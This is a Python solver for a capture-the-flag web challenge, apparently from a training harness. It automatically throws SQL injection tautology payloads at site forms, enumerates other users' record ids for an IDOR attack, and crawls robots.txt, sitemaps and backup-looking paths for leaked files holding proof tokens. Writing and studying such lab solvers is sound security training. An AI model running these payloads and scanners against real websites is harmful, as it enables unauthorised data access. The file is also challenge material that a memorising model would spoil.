#!/usr/bin/env python3
"""Solver for this challenge -- harness skeleton. Fill in `answer()`; keep the I/O contract unchanged.

    solve.py --contract <contract.json> --artifacts <dir>   ->  prints {answer_id: value} as JSON on the last line

Runs on the Homebase VM inside a ~6-7 s window for EVERY Mastery set: stdlib + lib.* + pyzipper/pyelftools/pefile/
capstone/pycryptodome/androguard only, no subprocess to 7z/jadx/etc., all sets well under 1 s. Mastery questions name
their files like 'delivery 2: sample_02.apk' or 'evidence.zip -> member': `artifact_bytes()` resolves both (by sha256
pairing first, so same-named per-set deliveries never get mixed up)."""
import argparse
import http.cookiejar
import json
import os
import sys
import re
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parents[4]
sys.path.insert(0, str(ROOT))
from lib.common import (container_by_sha, delivery_missing, find_artifact, group_by_set, load_contract,  # noqa: E402
                        normalize)

_cache = {}


def artifact_bytes(root, contract, artifact):
    """Bytes for a question's `artifact` string (cached per artifact)."""
    if artifact in _cache:
        return _cache[artifact]
    container, _, member = (x.strip() for x in artifact.partition("->"))
    data = None
    p = container_by_sha(root, contract, container)
    if p is not None and not member:
        data = p.read_bytes()
    elif not delivery_missing(root, contract, container):
        for cand in (artifact, container.split(": ", 1)[-1] + (f" -> {member}" if member else "")):
            try:
                data = find_artifact(root, cand)
                break
            except FileNotFoundError:
                continue
    _cache[artifact] = data
    return data


PROOF_RE = re.compile(rb"proof_[0-9A-Za-z]{8,}")
UA = {"User-Agent": "Mozilla/5.0 (hctf solver)"}
# Boolean-tautology payloads for a search box whose WHERE clause wraps the input in '%..%' and/or parentheses.
SQLI = ["zz') OR 1=1 --", "zz' OR 1=1 --", "zz')) OR 1=1 --", "zz') OR 1=1 OR ('a'='b", "zz' OR 1=1 OR 'a'='b",
        "zz\") OR 1=1 --", "zz\" OR 1=1 --", "zz') OR 1=1#", "zz' OR 1=1#", "zz OR 1=1"]


def target_url(contract, artifact):
    for t in contract.get("targets") or []:
        if (t.get("id") or "").strip().lower() == artifact.strip().lower():
            return t.get("url")
    ts = contract.get("targets") or []
    m = re.search(r"(\d+)", artifact or "")
    if m and len(ts) >= int(m.group(1)):
        return ts[int(m.group(1)) - 1].get("url")
    return ts[0].get("url") if len(ts) == 1 else None


def fetch(url, timeout=8):
    try:
        with urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout) as r:
            return r.read()
    except urllib.error.HTTPError as e:
        try:
            return e.read()
        except Exception:  # noqa: BLE001
            return b""
    except Exception:  # noqa: BLE001
        return b""


def find_proof(body):
    if not body:
        return None
    m = PROOF_RE.search(body)
    if m:
        return m.group(0).decode()
    if body[:2] == b"PK":   # an archive (backup) -> scan its members
        import io
        import zipfile
        try:
            z = zipfile.ZipFile(io.BytesIO(body))
            for n in z.namelist():
                try:
                    v = find_proof(z.read(n))
                except Exception:  # noqa: BLE001
                    continue
                if v:
                    return v
        except Exception:  # noqa: BLE001
            pass
    return None


def forms(base, html):
    """[(action_url, method, input_name)] for every text input of every form on a page."""
    out = []
    for fm in re.finditer(r"<form\b([^>]*)>(.*?)</form>", html, re.S | re.I):
        attrs, inner = fm.group(1), fm.group(2)
        act = re.search(r"action=['\"]([^'\"]*)['\"]", attrs, re.I)
        meth = re.search(r"method=['\"]([^'\"]*)['\"]", attrs, re.I)
        for inp in re.finditer(r"<input\b[^>]*name=['\"]([^'\"]+)['\"][^>]*>", inner, re.I):
            if re.search(r"type=['\"](hidden|submit|checkbox|radio)['\"]", inp.group(0), re.I):
                continue
            out.append((urllib.parse.urljoin(base, act.group(1) if act else ""), (meth.group(1) if meth else "get").lower(),
                        inp.group(1)))
    return out


def sqli(base, home):
    fs = forms(base, home.decode("utf-8", "replace")) or [(urllib.parse.urljoin(base, "/lookup"), "get", "q")]
    for action, method, name in fs:
        for pl in SQLI:
            if method == "post":
                try:
                    req = urllib.request.Request(action, data=urllib.parse.urlencode({name: pl}).encode(), headers=UA)
                    with urllib.request.urlopen(req, timeout=8) as r:
                        body = r.read()
                except urllib.error.HTTPError as e:
                    body = e.read()
                except Exception:  # noqa: BLE001
                    body = b""
            else:
                sep = "&" if "?" in action else "?"
                body = fetch(action + sep + urllib.parse.urlencode({name: pl}))
            v = find_proof(body)
            if v:
                return v
    return None


def exposed(base, home):
    """Earlier-day concept (leftover backup): follow robots.txt / sitemap / page-linked paths only."""
    paths = []
    for p in ("robots.txt", "sitemap.xml"):
        b = fetch(urllib.parse.urljoin(base, "/" + p)).decode("utf-8", "replace")
        v = find_proof(b.encode())
        if v:
            return v
        paths += re.findall(r"(?im)^\s*(?:dis)?allow:\s*(\S+)", b) + re.findall(r"<loc>([^<]+)</loc>", b)
    paths += re.findall(r"(?:href|src)=['\"]([^'\"#]+)['\"]", home.decode("utf-8", "replace"))
    paths += re.findall(r"<!--(.*?)-->", home.decode("utf-8", "replace"), re.S)
    seen = set()
    for p in paths:
        p = p.strip()
        if not p or p in seen or p == "/" or p.startswith(("mailto:", "javascript:")) or "*" in p:
            continue
        seen.add(p)
        if len(seen) > 25:
            break
        v = find_proof(fetch(urllib.parse.urljoin(base, p)))
        if v:
            return v
    return None


# ---- D02 IDOR + D01 backup exposure (compound: Mastery / live checks hand out an earlier day's target) -- ported
# from day02/web-permission-to-slip/solver (which carries day01's crawl): feeds leak foreign ids -> object API;
# robots/sitemap/backup links -> directory index -> leaked file (archives unpacked)
LINK_RE = re.compile(r"""(?:href|src)=["']([^"'#]+)["']""")
FETCH_RE = re.compile(r"""fetch\(\s*["'`]([^"'`]+)["'`]""")
IPROOF_RE = re.compile(r"\bproof[_-][A-Za-z0-9_-]{6,}")


class Site:
    def __init__(self, base):
        self.base = base if base.endswith("/") else base + "/"
        self.op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
        self.seen = {}

    def get(self, path):
        url = urllib.parse.urljoin(self.base, path)
        if urllib.parse.urlsplit(url).netloc != urllib.parse.urlsplit(self.base).netloc:
            return None
        if url in self.seen:
            return self.seen[url]
        try:
            with self.op.open(urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"}), timeout=8) as r:
                body = r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", "replace")
        except Exception:  # noqa: BLE001
            body = None
        self.seen[url] = body
        return body


def _ids(obj, out, owner_key=None):
    """Every (id, owner) pair in a JSON value: integer-ish values under keys named id / *_id."""
    if isinstance(obj, dict):
        owner = next((obj[k] for k in obj if k.lower() in ("owner", "user", "username", "owner_name")), None)
        for k, v in obj.items():
            if (k.lower() == "id" or k.lower().endswith("_id") or k.lower().endswith("id")) and \
                    isinstance(v, (int, str)) and str(v).isdigit():
                out.append((str(v), owner))
            else:
                _ids(v, out)
    elif isinstance(obj, list):
        for v in obj:
            _ids(v, out)


def solve_idor(base):
    s = Site(base)
    home = s.get("") or ""
    hits = IPROOF_RE.findall(home)
    if hits:
        return hits[0]
    me = None
    m = re.search(r"Signed in as\s+([^<]+)<", home)
    if m:
        me = m.group(1).strip()
    links = [l for l in LINK_RE.findall(home) if not l.startswith(("http", "//", "mailto:")) and "/assets/" not in l]
    templates, ids, pages = [], [], []
    for l in links:
        if re.search(r"/\d+/?$", l):
            pages.append(l)
            ids.append((re.search(r"(\d+)/?$", l).group(1), me))
    feeds = [l for l in links if l not in pages and l.strip("/")]
    # the record page tells which JSON endpoint it reads: fetch("/api/x/<id>") -> template
    for p in pages[:1]:
        body = s.get(p) or ""
        pid = re.search(r"(\d+)/?$", p).group(1)
        for f in FETCH_RE.findall(body):
            if pid in f:
                templates.append(f.replace(pid, "{id}"))
    if not templates and pages:
        templates.append(re.sub(r"\d+(/?)$", r"{id}\1", pages[0]))
    # feeds (activity/history/search endpoints) leak other users' row ids
    for f in feeds:
        body = s.get(f) or ""
        hits = IPROOF_RE.findall(body)
        if hits:
            return hits[0]
        try:
            j = json.loads(body)
        except ValueError:
            continue
        if me is None and isinstance(j, dict):
            me = next((v for k, v in j.items() if k.lower() in ("current_user", "user", "me") and isinstance(v, str)),
                      None)
        _ids(j, ids)
    mine = {i for i, o in ids if o == me}
    foreign = [i for i, o in ids if i not in mine and (o is None or o != me)]
    foreign = list(dict.fromkeys(foreign))
    best = None
    for fid in foreign:
        for t in templates:
            body = s.get(t.replace("{id}", fid)) or ""
            hits = IPROOF_RE.findall(body)
            if hits:
                return hits[0]
            try:
                j = json.loads(body)
            except ValueError:
                continue
            if isinstance(j, dict) and best is None:
                best = next((j[k] for k in ("proof", "flag", "note", "secret") if isinstance(j.get(k), str)), None)
    return best


# ---- D01 backup exposure (compound: Mastery / live checks hand out an earlier day's target) -- ported from
# day01/web-back-up-a-minute/solver: robots/sitemap/home links -> directory indexes -> backup files (archives unpacked)
BPROOF_RE = re.compile(rb"proof_[A-Za-z0-9_\-]{6,}|flag\{[^}\s]{1,200}\}")
BACKUP_RE = re.compile(r"\.(bak|old|orig|save|swp|tmp|backup|zip|tar|tgz|gz|7z|sql|json|env|txt|log|yml|yaml|conf|cfg|ini)"
                       r"(\.[a-z0-9]+)?$|~$|backup|snapshot|archive|dump|env", re.I)


def _bget(url, limit=4 << 20):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (hctf solver)"})
        with urllib.request.urlopen(req, timeout=6) as r:
            return r.read(limit)
    except Exception:  # noqa: BLE001
        return None


def _unpack(b):
    """Search texts of a body: itself plus members of zip / gzip / tar archives."""
    import gzip
    import io
    import tarfile
    import zipfile
    out = [b]
    try:
        if b[:2] == b"PK":
            from lib.common import read_member
            z = zipfile.ZipFile(io.BytesIO(b))
            for n in z.namelist():
                try:
                    out.append(z.read(n))
                except RuntimeError:
                    try:
                        out.append(read_member(io.BytesIO(b), n))
                    except Exception:  # noqa: BLE001
                        pass
        elif b[:2] == b"\x1f\x8b":
            g = gzip.decompress(b)
            out.append(g)
            if len(g) > 262 and g[257:262] == b"ustar":
                b = g
        if len(b) > 262 and b[257:262] == b"ustar":
            with tarfile.open(fileobj=io.BytesIO(b)) as t:
                for m in t.getmembers():
                    if m.isfile():
                        out.append(t.extractfile(m).read())
    except Exception:  # noqa: BLE001
        pass
    return out


def _bproof(b):
    for blob in _unpack(b or b""):
        m = BPROOF_RE.search(blob)
        if m:
            return m.group(0).decode("latin-1")
    return None


def _blinks(base, body):
    hrefs = re.findall(rb"""(?:href|src)\s*=\s*["']([^"'#]+)""", body or b"")
    return [urllib.parse.urljoin(base, h.decode("latin-1")) for h in hrefs]


def solve_backup(url):
    """D01: follow what the site discloses (robots Disallow / sitemap / backup-looking links), depth-2 same origin;
    the proof is the first `proof_...` token in a leaked file."""
    base = url if url.endswith("/") else url + "/"
    host = urllib.parse.urlsplit(base).netloc
    robots = _bget(urllib.parse.urljoin(base, "/robots.txt")) or b""
    paths = re.findall(rb"(?im)^\s*(?:dis)?allow\s*:\s*(\S+)", robots)
    paths += re.findall(rb"(?im)^\s*sitemap\s*:\s*(\S+)", robots)
    queue = [urllib.parse.urljoin(base, p.decode("latin-1").replace("*", "")) for p in paths if p.strip() != b"/"]
    home = _bget(base) or b""
    queue += [u for u in _blinks(base, home) if BACKUP_RE.search(urllib.parse.urlsplit(u).path)]
    seen = {base}
    while queue and len(seen) < 40:
        u = queue.pop(0)
        if u in seen or urllib.parse.urlsplit(u).netloc != host:
            continue
        seen.add(u)
        body = _bget(u)
        if not body:
            continue
        p = _bproof(body)
        if p:
            return p
        if b"<a " in body or b"<loc>" in body:
            for v in _blinks(u, body) + [x.decode("latin-1") for x in re.findall(rb"<loc>\s*([^<\s]+)", body)]:
                if v not in seen and v.startswith(base.rstrip("/")) and urllib.parse.urlsplit(v).path not in ("", "/") \
                        and not v.endswith((".css", ".svg", ".png", ".jpg", ".ico", ".woff2")):
                    queue.append(v)
    return _bproof(home)


def answer(answer_id, question, data, contract):
    """Return the value for one answer_id from its artifact bytes (None = cannot answer). Derive everything from
    `data`; never hard-code a variant's values."""
    url = target_url(contract, question.get("artifact") or "")
    if not url:
        return None
    base = url if url.endswith("/") else url + "/"
    home = fetch(base)
    v = find_proof(home)
    if v:
        return v
    # every known concept probe on every target (Mastery / live compounding mixes earlier days' bugs in), cheapest
    # recon first: a text-input form -> D03 SQLi; "Signed in as" / numeric record links -> D02 IDOR; then D01 backup
    # crawl (robots Disallow dir -> its index -> the file), then whatever was not tried yet
    page = home.decode("utf-8", "replace")
    probes = []
    if forms(base, page):
        probes.append("sqli")
    if re.search(r"Signed in as|href=['\"]/[\w-]+/\d+/?['\"]", page):
        probes.append("idor")
    probes += ["backup", "exposed", "sqli", "idor"]
    best = None
    for name in dict.fromkeys(probes):
        if name == "sqli":
            v = sqli(base, home)
        elif name == "idor":
            v = solve_idor(base)
            if v is not None and not IPROOF_RE.fullmatch(str(v)):
                best, v = best or v, None
        elif name == "backup":
            v = solve_backup(base)
        else:
            v = exposed(base, home)
        if v:
            return v
    return best


def fallback(answer_id, question, data, contract):
    """Called ONLY when answer() found nothing (None or an exception): a cheap generic second try for a variant shape
    the direct parse doesn't know (Time Trial / Mastery mutate the task) -- e.g. the lane lib's name-agnostic decoder
    over `data`, then a match against question["answer_format"]. None = give up on this field only."""
    return None


def _past_deadline():
    """The timed runner's HCTF_SOLVE_DEADLINE (epoch) has passed: print the answers found so far instead."""
    try:
        return time.time() > float(os.environ["HCTF_SOLVE_DEADLINE"])
    except (KeyError, ValueError):
        return False


def _solve_pairs(job):
    """Answer one group of (answer_id, question) pairs -- a whole Mastery set, or the whole contract."""
    root, contract, pairs = job
    out = {}
    for aid, q in pairs:
        data = artifact_bytes(root, contract, q.get("artifact") or "")
        try:
            v = answer(aid, q, data, contract)
        except Exception as e:  # noqa: BLE001 - one bad field must not sink the other answers
            print(f"{aid}: {e!r}", file=sys.stderr)
            v = None
        if v is None and not _past_deadline():   # in-window: never let a fallback search eat the kill margin
            try:
                v = fallback(aid, q, data, contract)
            except Exception as e:  # noqa: BLE001
                print(f"{aid}: fallback {e!r}", file=sys.stderr)
        if v is not None:
            out[aid] = normalize(v, q)
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--contract", required=True)
    ap.add_argument("--artifacts", required=True)
    a = ap.parse_args()
    contract, pairs = load_contract(a.contract)
    groups = group_by_set(pairs)
    out = {}
    if len(groups) >= 2 and os.environ.get("HCTF_SOLVER_PARALLEL", "1") != "0":
        # Mastery: every set runs inside ONE clock -- one forked process per set (the Homebase VM has 2 vCPUs; heavy
        # per-set work such as unzipping 31 MB deliveries halves). Same results as the sequential loop.
        import multiprocessing as mp
        from concurrent.futures import ProcessPoolExecutor
        try:
            from lib.solverrt import max_procs   # HCTF_SOLVER_MAX_PROCS: the harness's small-pool rehearsal
            with ProcessPoolExecutor(max_workers=max_procs(len(groups)),
                                     mp_context=mp.get_context("fork")) as ex:
                for part in ex.map(_solve_pairs, [(a.artifacts, contract, g) for g in groups.values()]):
                    out.update(part)
        except Exception as e:  # noqa: BLE001 - never lose a solve to the pool: fall back to sequential
            print(f"parallel sets failed ({e!r}); sequential", file=sys.stderr)
            out = _solve_pairs((a.artifacts, contract, pairs))
    else:
        out = _solve_pairs((a.artifacts, contract, pairs))
    print(json.dumps(out))


if __name__ == "__main__":
    main()
